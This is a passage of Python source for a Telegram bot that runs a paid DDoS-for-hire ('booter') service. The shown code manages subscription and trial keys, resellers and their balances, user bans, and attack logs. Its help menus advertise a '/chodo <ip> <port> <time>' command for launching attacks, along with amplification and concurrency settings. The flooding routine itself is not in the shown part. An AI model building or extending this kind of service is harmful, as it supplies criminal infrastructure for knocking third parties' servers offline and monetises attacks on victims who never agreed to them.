            'created_by': user_id,
            'created_by_username': reseller_username,
            'created_by_type': 'reseller_trail',
            'used': False,
            'used_by': None,
            'used_at': None,
            'max_users': max_users,
            'current_users': 0,
            'is_trail': True,
            'reseller_id': reseller_id
        }
        
        try:
            bot.send_message(reseller_id, f"🎁 Reseller Trail Key Received!\n\n🔑 Key: {key}\n⏰ Duration: {hours} hours\n👥 Max Users: {max_users}\n\nShare this key with your customers!", parse_mode="Markdown")
            sent_count += 1
        except:
            pass
    
    save_keys(keys_db)  # ✅ SAVE
    
    safe_send_message(message.chat.id, f"✅ Reseller Trail Keys Sent!\n\n👥 Total Resellers: {len(active_resellers)}\n📨 Successfully Sent: {sent_count}\n⏰ Duration: {hours} hours", reply_to=message)

@bot.message_handler(commands=["del_trail", "detrail"])
def delete_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) == 1:
        safe_send_message(message.chat.id, "⚠️ Do you really want to delete all trail keys?\n\nTo confirm, use /del_trail confirm.", reply_to=message)
        return
        
    if command_parts[1].lower() == "confirm":
        deleted = 0
        keys_to_delete = []
        for key, key_data in keys_db.items():
            if key_data.get('is_trail'):
                keys_to_delete.append(key)
        for key in keys_to_delete:
            del keys_db[key]
            deleted += 1
        save_keys(keys_db)  # ✅ SAVE
        safe_send_message(message.chat.id, f"✅ {deleted} trail keys have been deleted!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Confirmation failed! Use /del_trail confirm.", reply_to=message)

@bot.message_handler(commands=["del_exp_key", "delexpkey"])
def del_exp_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    expired_keys = []
    for key, key_data in keys_db.items():
        if key_data.get('used'):
            user = users_db.get(key_data.get('used_by'))
            if user:
                if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                    expired_keys.append(key_data)
            else:
                expired_keys.append(key_data)
    
    if not expired_keys:
        safe_send_message(message.chat.id, "✅ No expired keys found!", reply_to=message)
        return
    
    pending_del_exp_key = {}
    pending_del_exp_key[user_id] = expired_keys
    
    safe_send_message(message.chat.id, f"⚠️ Found {len(expired_keys)} expired keys!\n\nType /confirm_del_exp_key to confirm.", reply_to=message)

@bot.message_handler(commands=["confirm_del_exp_key"])
def confirm_del_exp_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp_key:
        safe_send_message(message.chat.id, "❌ First use /del_exp_key!", reply_to=message)
        return
    
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    
    deleted_count = 0
    for key in expired_keys:
        if key['key'] in keys_db:
            del keys_db[key['key']]
            deleted_count += 1
    
    save_keys(keys_db)  # ✅ SAVE
    
    safe_send_message(message.chat.id, f"✅ {deleted_count} expired keys deleted!", reply_to=message)

@bot.message_handler(commands=["del_exp_usr", "delexpusr"])
def del_exp_usr_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    expired_users = []
    for uid, user in users_db.items():
        if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
            expired_users.append(user)
    
    if not expired_users:
        safe_send_message(message.chat.id, "✅ No expired users found!", reply_to=message)
        return
    
    pending_del_exp = {}
    pending_del_exp[user_id] = expired_users
    
    safe_send_message(message.chat.id, f"⚠️ Found {len(expired_users)} expired users!\n\nType /confirm_del_exp to confirm.", reply_to=message)

@bot.message_handler(commands=["confirm_del_exp"])
def confirm_del_exp_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    if user_id not in pending_del_exp:
        safe_send_message(message.chat.id, "❌ First use /del_exp_usr!", reply_to=message)
        return
    
    expired_users = pending_del_exp[user_id]
    del pending_del_exp[user_id]
    
    deleted_count = 0
    for user in expired_users:
        if user['user_id'] in users_db:
            del users_db[user['user_id']]
            deleted_count += 1
    
    save_users(users_db)  # ✅ SAVE
    
    safe_send_message(message.chat.id, f"✅ {deleted_count} expired users deleted!", reply_to=message)

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /extend <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_db.get(target_user_id)
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    
    users_db[target_user_id]['key_expiry'] = new_expiry
    save_users(users_db)  # ✅ SAVE
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    try:
        bot.send_message(target_user_id, f"🎉 Time Extended!\n\n⏰ Added: {duration_label}\n⏳ Total Time: {new_remaining}\n\nEnjoy!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ Time Extended!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Added: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["extend_all", "extendall"])
def extend_all_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /extend_all <time>", reply_to=message)
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    if not users_db:
        safe_send_message(message.chat.id, "❌ No users with keys found!", reply_to=message)
        return
    
    extended_count = 0
    notified_count = 0
    
    for uid, user in users_db.items():
        old_expiry = user.get('key_expiry')
        
        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration
            
        users_db[uid]['key_expiry'] = new_expiry
        extended_count += 1
        
        try:
            bot.send_message(uid, f"🎉 Time Extended for ALL Users!\n\n⏰ Added: {duration_label}\n\nEnjoy!")
            notified_count += 1
        except:
            pass
    
    save_users(users_db)  # ✅ SAVE
        
    safe_send_message(message.chat.id, f"✅ Done! Everyone's time has been extended.\n\n👤 Total Users: {extended_count}\n📨 Notified: {notified_count}\n⏰ Added: {duration_label}", reply_to=message)

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /down <id or @username> <time>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, "❌ Invalid duration!", reply_to=message)
        return
    
    user = users_db.get(target_user_id)
    
    if not user:
        safe_send_message(message.chat.id, "❌ User not found in key database!", reply_to=message)
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        safe_send_message(message.chat.id, "❌ User does not have an active key!", reply_to=message)
        return
    
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    
    if new_expiry <= datetime.now():
        users_db[target_user_id]['key'] = None
        users_db[target_user_id]['key_expiry'] = None
        safe_send_message(message.chat.id, f"⚠️ Key Expired!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n❌ Key removed!", reply_to=message)
    else:
        users_db[target_user_id]['key_expiry'] = new_expiry
        new_remaining = format_timedelta(new_expiry - datetime.now())
        safe_send_message(message.chat.id, f"✅ Time Reduced!\n\n👤 User: {display}\n🆔 ID: {target_user_id}\n⏰ Reduced: {duration_label}\n⏳ New Time: {new_remaining}", reply_to=message)
    
    save_users(users_db)  # ✅ SAVE

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /delkey <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    if key_input in keys_db:
        del keys_db[key_input]
        for uid, user in users_db.items():
            if user.get('key') == key_input:
                users_db[uid]['key'] = None
                users_db[uid]['key_expiry'] = None
        save_keys(keys_db)   # ✅ SAVE
        save_users(users_db) # ✅ SAVE
        safe_send_message(message.chat.id, f"✅ Key {key_input} deleted!", reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)

@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /key <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_db.get(key_input)
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Key not found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "🔑 KEY DETAILS\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🔑 Key: {key_input}\n"
    response += f"⏰ Duration: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"⏱️ Seconds: {key_doc.get('duration_seconds', 0)}\n"
    response += f"📅 Created: {key_doc.get('created_at', 'Unknown')}\n"
    
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"👤 Creator: {creator} (Reseller)\n"
    else:
        response += f"👤 Creator: OWNER\n"
    
    response += f"\n📊 Status: {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
    
    if key_doc.get('used'):
        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"📅 Used At: {key_doc.get('used_at', 'Unknown')}\n"
        
        for user in users_db.values():
            if user.get('key') == key_input:
                response += f"\n─── USER INFO ───\n"
                response += f"👤 Username: {user.get('username', 'Unknown')}\n"
                response += f"🆔 User ID: {user.get('user_id', 'Unknown')}\n"
                
                expiry = user.get('key_expiry')
                if expiry:
                    if expiry > datetime.now():
                        remaining = format_timedelta(expiry - datetime.now())
                        response += f"⏳ Remaining: {remaining}\n"
                        response += f"✅ Status: ACTIVE\n"
                    else:
                        response += f"❌ Status: EXPIRED\n"
                break
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    unused_keys = []
    used_keys = []
    for key_data in keys_db.values():
        if not key_data.get('used'):
            unused_keys.append(key_data)
        else:
            used_keys.append(key_data)
    
    content = "═══════════════════════════\n"
    content += "       ALL KEYS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 UNUSED KEYS ({len(unused_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(unused_keys[:50], 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Created: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   By: {key.get('created_by_username')}\n"
        content += "\n"
    
    content += f"\n🔴 USED KEYS ({len(used_keys)})\n"
    content += "───────────────────────────\n"
    for i, key in enumerate(used_keys[:50], 1):
        content += f"{i}. {key['key']}\n"
        content += f"   Duration: {key.get('duration_label', 'N/A')}\n"
        content += f"   Used by: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   Used at: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   Created by: {key.get('created_by_username')}\n"
        content += "\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(unused_keys)} unused | {len(used_keys)} used\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"📋 All Keys Report\n\n🟢 Unused: {len(unused_keys)}\n🔴 Used: {len(used_keys)}")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    active_users = []
    expired_users = []
    
    for user in users_db.values():
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    
    content = "═══════════════════════════\n"
    content += "       ALL USERS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    
    content += f"🟢 ACTIVE USERS ({len(active_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(active_users[:50], 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"
        
        attack_count = 0
        for log in attack_logs_db:
            if log.get('user_id') == user['user_id']:
                attack_count += 1
        
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        content += f"   Duration: {user.get('key_duration_label', 'N/A')}\n"
        content += f"   Time Left: {time_str}\n"
        content += f"   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   Reseller: @{user['reseller_username']}\n"
        content += "\n"
    
    content += f"\n🔴 EXPIRED USERS ({len(expired_users)})\n"
    content += "───────────────────────────\n"
    
    for i, user in enumerate(expired_users[:50], 1):
        attack_count = 0
        for log in attack_logs_db:
            if log.get('user_id') == user['user_id']:
                attack_count += 1
        content += f"{i}. {user.get('username', 'Unknown')}\n"
        content += f"   ID: {user['user_id']}\n"
        content += f"   Key: {user.get('key', 'N/A')}\n"
        if user.get('key_expiry'):
            content += f"   Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n"
        content += "\n"
    
    content += "\n═══════════════════════════\n"
    content += f"TOTAL: {len(active_users)} Active | {len(expired_users)} Expired\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"👥 All Users Report\n\n🟢 Active: {len(active_users)}\n🔴 Expired: {len(expired_users)}")

@bot.message_handler(commands=["user"])
def user_info_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /user <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    user = users_db.get(target_user_id)
    reseller = resellers_db.get(target_user_id)
    bot_user = bot_users_db.get(target_user_id)
    
    response = "═══════════════════════════\n"
    response += "👤 USER INFORMATION\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🆔 ID: <code>{target_user_id}</code>\n"
    if resolved_name:
        response += f"📛 Username: @{resolved_name}\n"
    
    if bot_user:
        if bot_user.get('first_name'):
            response += f"👤 Name: {bot_user.get('first_name')}\n"
        if bot_user.get('first_seen'):
            response += f"📅 First Seen: {bot_user['first_seen'].strftime('%d-%m-%Y %H:%M')}\n"
    
    if target_user_id == BOT_OWNER:
        response += "\n👑 Role: OWNER\n"
    elif reseller:
        response += f"\n💼 Role: RESELLER\n"
        response += f"💰 Balance: {reseller.get('balance', 0)} Rs\n"
        response += f"🔑 Keys Generated: {reseller.get('total_keys_generated', 0)}\n"
        if reseller.get('blocked'):
            response += "🚫 Status: BLOCKED\n"
        else:
            response += "✅ Status: ACTIVE\n"
        if reseller.get('added_at'):
            response += f"📅 Added: {reseller['added_at'].strftime('%d-%m-%Y')}\n"
    else:
        response += "\n👤 Role: USER\n"
    
    if user:
        response += "\n═══════════════════════════\n"
        response += "🔑 KEY DETAILS\n"
        response += "═══════════════════════════\n\n"
        
        if user.get('banned'):
            response += "🚫 STATUS: BANNED\n"
            if user.get('banned_at'):
                response += f"📅 Banned At: {user['banned_at'].strftime('%d-%m-%Y %H:%M')}\n"
        
        if user.get('key'):
            response += f"🔑 Key: <code>{user['key']}</code>\n"
            response += f"⏰ Duration: {user.get('key_duration_label', 'N/A')}\n"
            
            if user.get('redeemed_at'):
                response += f"📅 Redeemed: {user['redeemed_at'].strftime('%d-%m-%Y %H:%M')}\n"
            
            if user.get('key_expiry'):
                if user['key_expiry'] > datetime.now():
                    remaining = user['key_expiry'] - datetime.now()
                    days = remaining.days
                    hours, rem = divmod(remaining.seconds, 3600)
                    mins, secs = divmod(rem, 60)
                    response += f"⏳ Remaining: {days}d {hours}h {mins}m\n"
                    response += f"📆 Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
                    response += "✅ Status: ACTIVE\n"
                else:
                    response += f"📆 Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
                    response += "❌ Status: EXPIRED\n"
            
            if user.get('reseller_username'):
                response += f"💼 Reseller: @{user['reseller_username']}\n"
        else:
            response += "❌ No Active Key\n"
    else:
        response += "\n❌ No Key History\n"
    
    user_keys = []
    for key_data in keys_db.values():
        if key_data.get('used_by') == target_user_id:
            user_keys.append(key_data)
    user_keys.sort(key=lambda x: x.get('used_at', datetime.min), reverse=True)
    
    if user_keys:
        response += "\n═══════════════════════════\n"
        response += "📜 KEY HISTORY (Last 5)\n"
        response += "═══════════════════════════\n\n"
        for k in user_keys[:5]:
            response += f"• {k.get('duration_label', 'N/A')}"
            if k.get('used_at'):
                response += f" ({k['used_at'].strftime('%d-%m-%Y')})"
            response += "\n"
    
    attack_count = 0
    user_attacks = []
    for log in attack_logs_db:
        if log.get('user_id') == target_user_id:
            attack_count += 1
            user_attacks.append(log)
    user_attacks.sort(key=lambda x: x.get('timestamp', datetime.min), reverse=True)
    
    response += "\n═══════════════════════════\n"
    response += "⚔️ ATTACK STATS\n"
    response += "═══════════════════════════\n\n"
    response += f"📊 Total Attacks: {attack_count}\n"
    
    if user_attacks:
        response += "\n📜 Recent Attacks:\n"
        for i, atk in enumerate(user_attacks[:5], 1):
            response += f"{i}. {atk['target']}:{atk['port']} ({atk['duration']}s)\n"
            if atk.get('timestamp'):
                response += f"   📅 {atk['timestamp'].strftime('%d-%m-%Y %H:%M')}\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /ban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if target_user_id == BOT_OWNER:
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
    
    if target_user_id not in users_db:
        users_db[target_user_id] = {}
    
    users_db[target_user_id]['user_id'] = target_user_id
    users_db[target_user_id]['username'] = resolved_name
    users_db[target_user_id]['banned'] = True
    users_db[target_user_id]['banned_at'] = datetime.now()
    save_users(users_db)  # ✅ SAVE
    
    try:
        bot.send_message(target_user_id, "🚫 You have been banned!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"✅ User {display} banned!\n🆔 ID: {target_user_id}", reply_to=message)

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unban <id or @username>", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if target_user_id in users_db and users_db[target_user_id].get('banned'):
        users_db[target_user_id]['banned'] = False
        save_users(users_db)  # ✅ SAVE
        display = f"@{resolved_name}" if resolved_name else str(target_user_id)
        try:
            bot.send_message(target_user_id, "✅ Your ban has been lifted!")
        except:
            pass
        safe_send_message(message.chat.id, f"✅ User {display} unbanned!\n🆔 ID: {target_user_id}", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ User not found or already unbanned!", reply_to=message)

@bot.message_handler(commands=["banned"])
def list_banned_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    banned_users = []
    for user in users_db.values():
        if user.get('banned'):
            banned_users.append(user)
    
    if not banned_users:
        safe_send_message(message.chat.id, "📋 No banned users found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "🚫 BANNED USERS\n"
    response += "═══════════════════════════\n\n"
    
    for i, user in enumerate(banned_users[:20], 1):
        response += f"{i}. 👤 {user['user_id']}\n"
        if user.get('username'):
            response += f"   📛 {user['username']}\n"
    
    response += f"\n═══════════════════════════\n"
    response += f"📊 Total Banned: {len(banned_users)}\n"
    response += "═══════════════════════════"
    
    send_long_message(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["remove_user"])
def remove_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_user <id or @username>", reply_to=message)
        return
    
    target_id, resolved_name = resolve_user(command_parts[1])
    if not target_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    users = get_users()
    if str(target_id) in users:
        del users[str(target_id)]
        save_users(users)
        safe_send_message(message.chat.id, f"✅ User {resolved_name or target_id} removed from database!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ User not found in database!", reply_to=message)
        
@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /tban <id or @username> <time>\nExample: /tban 123456 10m", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
        
    if target_user_id == BOT_OWNER:
        safe_send_message(message.chat.id, "❌ Cannot ban the owner!", reply_to=message)
        return
        
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    
    if not duration_td:
        safe_send_message(message.chat.id, "❌ Invalid duration format! Use: 10m, 1h, 1d etc.", reply_to=message)
        return
        
    ban_expiry = datetime.now() + duration_td
    if target_user_id not in users_db:
        users_db[target_user_id] = {}
    
    users_db[target_user_id]['banned'] = True
    users_db[target_user_id]['ban_type'] = 'temporary'
    users_db[target_user_id]['ban_expiry'] = ban_expiry
    save_users(users_db)  # ✅ SAVE
    
    safe_send_message(message.chat.id, f"🚫 User {resolved_name or target_user_id} has been banned for {label}!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}", reply_to=message)

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    
    help_text = f'''
👑 OWNER PANEL

⚙️ CURRENT SETTINGS:
• Max Attack Time: {get_max_attack_time()}s
• Min Attack Time: {MIN_ATTACK_TIME}s
• Individual Cooldown: {get_user_cooldown_setting()}s
• Attack Amplification: {get_concurrent_limit()}x
• Max Concurrent Slots: {total_slots}
• Available Slots: {free_slots}/{total_slots}

🔑 KEY MANAGEMENT:
• /gen <time> <count> - Generate keys
• /key <key> - Key details
• /allkeys - All keys
• /delkey <key> - Delete key
• /del_exp_key - Delete expired keys
• /trail <hrs> <max> - Trail keys
• /reseller_trail <id> <hrs> - Give trail to reseller
• /del_trail - Delete all trail keys

👥 USER MANAGEMENT:
• /user <id> - User info
• /allusers - All users
• /extend <id> <time> - Extend time
• /extend_all <time> - Extend everyone's time
• /down <id> <time> - Reduce time
• /del_exp_usr - Delete expired users
• /ban <id> - Ban user
• /unban <id> - Unban user
• /banned - Banned users
• /tban <id> <time> - Temp ban

💼 RESELLER MANAGEMENT:
• /add_reseller <id> - Add reseller
• /remove_reseller <id> - Remove reseller
• /block_reseller <id> - Block
• /unblock_reseller <id> - Unblock
• /all_resellers - All resellers
• /saldo_add <id> <amt> - Add balance
• /saldo_remove <id> <amt> - Remove balance
• /saldo <id> - Check balance
• /user_resell <id> - Reseller's users
• /setprice - View/change pricing

📢 BROADCAST:
• /broadcast - Message to all
• /broadcast_reseller - Message to resellers
• /broadcast_paid - Message to paid users only

⚡ ATTACK SETTINGS:
• /chodo <ip> <port> <time> - Attack (min 60s)
• /status - Attack status
• /max_attack <sec> - Set max attack time
• /cooldown <sec> - Set individual cooldown
• /concurrent <num> - Set attack amplification
• /max_concurrent <num> - Set max simultaneous users
• /block_ip <prefix> - Block IP
• /unblock_ip <prefix> - Unblock IP
• /blocked_ips - View blocked IPs
• /prot_on - Port Protection ON
• /prot_off - Port Protection OFF

📊 MONITORING:
• /live - Server stats
• /logs - Attack logs (txt file)
• /del_logs - Delete all logs

🔧 MAINTENANCE:
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = '''
👑 Welcome Owner!

Use /owner to access the full owner panel with all commands.

🔐 Regular User Commands:
• /id - View your ID
• /ping - Check bot status
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /chodo <ip> <port> <time> - Start an attack (min 60s)

DDOS BOT OWNER - @DAEMON_OWNER
'''
    elif is_reseller(user_id):
        help_text = '''
💼 RESELLER PANEL

🆔 ID:
• /id - View your ID
• /ping - Check bot status

💰 BALANCE:
• /mysaldo - Check your balance
• /prices - View key prices

🔑 KEY GENERATION:
• /gen <duration> <count> - Generate keys
  Durations: 12h, 1d, 3d, 7d, 30d, 60d

⚡ ATTACK:
• /redeem <key> - Redeem a key
• /chodo <ip> <port> <time> - Attack (min 60s)
• /status - Attack status
• /mykey - Key details

DDOS BOT OWNER CONTACT FOR RESELLING - @DAEMON_OWNER

📸 **Note:** After each attack, you must send a screenshot as feedback before starting another attack.
'''
    else:
        help_text = '''
🔐 COMMANDS:
• /id - View your ID
• /ping - Check bot status
• /redeem <key> - Redeem a key
• /mykey - View key details
• /status - View attack status
• /chodo <ip> <port> <time> - Start an attack (min 60s)

DDOS BOT OWNER - @DAEMON_OWNER

📸 **Note:** After each attack, you must send a screenshot as feedback before starting another attack.
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username, user_name)
    if check_maintenance(message): return
    if check_banned(message): return
    
    # 🔥 AUTO VERIFY – Channel join check
    if not is_owner(user_id):
        if is_user_joined_channel(user_id):
            if user_id not in verified_users:
                verified_users.add(user_id)
                save_verified_users(verified_users)
                safe_send_message(message.chat.id, 
                    f"✅ **Auto-Verified!**\n\n"
                    f"Welcome {user_name}! You have been automatically verified.\n\n"
                    f"You can now use all bot commands.\n\n"
                    f"Use /help to see commands.",
                    reply_to=message, parse_mode="Markdown")
                return
        else:
            safe_send_message(message.chat.id, 
                f"❌ **Join Channel First!**\n\n"
                f"Welcome {user_name}!\n\n"
                f"Please join our private channel to use this bot.\n\n"
